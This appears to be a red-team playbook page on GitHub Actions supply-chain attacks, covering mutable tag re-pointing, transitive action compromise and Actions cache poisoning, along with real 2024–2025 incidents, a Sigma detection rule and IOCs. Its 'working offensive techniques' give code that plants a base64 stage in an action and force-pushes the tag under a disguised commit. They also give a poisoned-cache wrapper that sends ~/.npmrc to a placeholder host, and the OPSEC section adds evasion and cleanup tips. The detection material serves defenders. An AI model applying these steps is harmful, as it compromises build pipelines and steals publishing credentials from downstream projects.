# Compromised Actions, Mutable Tags & Cache Poisoning

ATT&CK: T1195.001 (Compromise Software Dependencies and Development Tools), T1525 (Implant Internal
Image / poison shared build cache) · CWE-494 (Download of Code Without Integrity Check), CWE-1357
(Reliance on Insufficiently Trustworthy Component), CWE-349 (Acceptance of Extraneous Untrusted Data),
CWE-829 (Inclusion of Functionality from Untrusted Control Sphere).

## Theory / Mechanism

A `uses:` line in a workflow imports *someone else's code* into your privileged pipeline. Three
distinct integrity gaps make this exploitable:

1. **Mutable git tags.** `uses: org/action@v1` resolves a git ref **on every run**, not at pin time.
   Tags are ordinary refs; anyone with write to the action repo (or a stolen bot PAT) can force-push
   `v1` / `v46` to a malicious commit, instantly poisoning every downstream consumer that pins by tag.
   Only a full 40-char commit SHA (`@<sha>`) is immutable.

2. **Transitive trust.** Actions call other actions. Compromising a deep, low-profile dependency
   (e.g. `reviewdog/action-setup`) lets an attacker reach a popular consumer (`tj-actions`) that
   imports it, which is itself imported by 20k+ repos.

3. **Poisonable Actions cache.** Even a *read-only* `GITHUB_TOKEN`/`ACTIONS_RUNTIME_TOKEN` can
   **write** the cross-workflow Actions cache for an arbitrary key. A low-privilege fork-PR job writes
   a poisoned cache entry; a later privileged release workflow restores that key (used implicitly by
   `actions/cache`, `setup-node`, `setup-python`, etc.) and executes the payload during build —
   bridging from unprivileged context to the release pipeline (cross-workflow escalation, CWE-349).

## Working offensive techniques (authorized)

### A. Poison a controlled Action via mutable tag
If you control (or have compromised the publishing token of) an action `evilcorp/setup`:
```bash
# Inject a base64 stage into the action entrypoint, then re-point the tag victims pin
cat >> index.js <<'EOF'
const c=require('child_process');
c.exec('node -e "'+Buffer.from(process.env.STAGE2_B64,'base64').toString()+'"');
EOF
git commit -am "perf: cache tweak"          # innocuous-looking message
git tag -f v1 && git push -f origin v1       # mutable tag re-point => all @v1 consumers poisoned
```
Downstream `uses: evilcorp/setup@v1` now executes the stage on every run with that repo's token+secrets.

### B. Actions cache poisoning (cross-workflow escalation)
From an unprivileged fork-PR job, write a cache key that the privileged release job restores:
```yaml
# malicious fork PR job — only needs the default (even read-only) ACTIONS_RUNTIME_TOKEN
- run: |
    mkdir -p node_modules/.bin
    printf '#!/bin/sh\ncurl -s https://OOB/$(cat ~/.npmrc|base64 -w0)\nexec "$@"\n' > node_modules/.bin/wrap
    chmod +x node_modules/.bin/wrap
- uses: actions/cache/save@v4
  with: { path: node_modules, key: node-modules-${{ hashFiles('package-lock.json') }} }
# Later, the trusted release workflow restores key `node-modules-...` and runs the poisoned tree.
```
Tooling: `cache-poisoning` PoCs and `gato-x` document this; defenders should treat the cache as
attacker-writable.

### C. Detect unpinned / re-pointed actions across a target
```bash
python3 scripts/malicious_action_scanner.py --path ./repo --check-pins --check-known-bad
# - lists every `uses:` ref; flags tag/branch pins (mutable) vs 40-char SHA (immutable)
# - resolves the *current* SHA a tag points to and diffs it against a recorded baseline (re-point)
# - matches against a built-in known-compromised list (tj-actions, reviewdog, ...)
```

## Modern 2024-2026 incidents (verified)

- **CVE-2025-30066 — `tj-actions/changed-files` (Mar 2025).** Attacker (via a compromised
  `@tj-actions-bot` PAT) **retroactively re-pointed every version tag** of `changed-files` (through
  v45.0.7) to malicious commit `0e58ed8671d6b60d0890c21b07f8835ace038e67`. The injected Node code
  pulled a Python script that scraped the Runner Worker process memory for secrets and **printed
  them (double-base64) into the build log** — world-readable on public repos. ~23,000 repositories
  affected. **SHA-pinned consumers were immune** (unless they happened to pin the malicious SHA).
  Fixed in v46.0.1; GitHub removed the malicious commits and the hosting gist (2025-03-15).
- **CVE-2025-30154 — `reviewdog/action-setup@v1` (Mar 2025).** The `v1` tag was temporarily pointed
  to a malicious commit on 2025-03-11. `reviewdog/action-setup` was used inside
  `tj-actions/eslint-changed-files`, which `tj-actions/changed-files` ran with a privileged PAT — the
  **transitive compromise** that likely seeded CVE-2025-30066. Originally a targeted attack on Coinbase.
- **Ultralytics (Dec 2024) — cache-poisoning twist.** A `pull_request_target` shell-injection bug
  could not directly reach publishing creds, so the attacker **poisoned the Actions cache**; the
  legitimate release workflow restored it and built two PyPI wheels carrying a crypto miner.
- **Structural root cause (Lyrie/Wiz analysis).** Nearly every major 2024-2026 GHA incident traces to
  four defaults: `pull_request_target` scope bleed, **mutable tags**, the shared fork object pool, and
  the **poisonable Actions cache**.

## Detection

**Diff resolved SHA vs lockfile / baseline (the single strongest control):**
```bash
# Record a baseline of tag->SHA for every action you use, then alert on drift
gh api repos/tj-actions/changed-files/git/ref/tags/v46 -q .object.sha
```

**Sigma — GitHub audit log: action tag re-point (force-push to a tag ref):**
```yaml
title: GitHub Action Version Tag Force-Pushed (Possible Action Compromise)
id: 7d1f3a44-2c9b-4e88-bf01-cicdtag0001
logsource: { product: github, service: audit }
detection:
  sel:
    action: 'git.push'
    ref|startswith: 'refs/tags/'
    forced: true
  condition: sel
level: high
```

**Build-log secret scrape IOC (tj-actions class):** a `changed-files`/action step emitting a long
double-base64 blob. Decode and check for credentials:
```bash
echo "<blob>" | base64 -d | base64 -d
```

**IOCs:** unpinned `@v*`/`@main` action refs; an action ref whose resolved SHA changed without a
release; base64 in action `index.js`/`dist/`; cache `save`/`restore` of the same key across a
read-only fork job and a privileged release job; the tj-actions malicious SHA
`0e58ed8671d6b60d0890c21b07f8835ace038e67`.

## OPSEC

- Touches: the action repo's git history + tag refs (force-push is logged), every downstream build
  log, the Actions cache store. Tag re-points are visible org-side and via `git reflog` on mirrors.
- Cleanup: re-point the tag back to the benign SHA after staging — but the audit log and any mirror
  (e.g. dependabot, GH archive) retain evidence; consider this a one-shot, high-noise technique.
- Evasion: innocuous commit messages ("perf", "ci"); poison the cache instead of the workflow to
  avoid editing tracked files; prefer compromising a deep transitive action (less-watched) over a
  popular one. SHA-pinning by the victim defeats the mutable-tag vector entirely — target tag users.

## References

- GitHub Advisory GHSA-mrrh-fwg8-r2c3 / NVD CVE-2025-30066 (tj-actions/changed-files).
- CISA Alert (2025-03-18): tj-actions/changed-files (CVE-2025-30066) and reviewdog/action-setup (CVE-2025-30154).
- Wiz, "GitHub Action tj-actions/changed-files supply chain attack."
- Unit 42 (Palo Alto), "GitHub Actions Supply Chain Attack: targeting Coinbase, expanded to tj-actions."
- Sysdig, "Detecting and Mitigating the tj-actions/changed-files Supply Chain Attack (CVE-2025-30066)."
- Lyrie Research / Wiz on mutable tags + Actions cache poisoning; Ultralytics PyPI miner incident.
